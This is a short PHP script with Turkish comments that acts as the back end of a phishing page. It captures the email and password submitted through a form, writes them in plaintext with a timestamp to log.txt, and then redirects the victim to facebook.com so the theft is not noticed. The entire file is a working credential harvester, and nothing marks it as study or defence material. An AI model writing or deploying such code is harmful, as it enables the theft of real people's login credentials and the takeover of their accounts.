<?php
// Formdan gelen verileri al
$email = $_POST['email'];
$password = $_POST['password'];
$date = date("Y-m-d H:i:s");

// log.txt dosyasına yaz
$file = fopen("log.txt", "a");
fwrite($file, "EMAIL: $email | PASSWORD: $password | DATE: $date\n");
fclose($file);

// index.html sayfasına geri yönlendir
header("Location: https://www.facebook.com");
exit();
?>
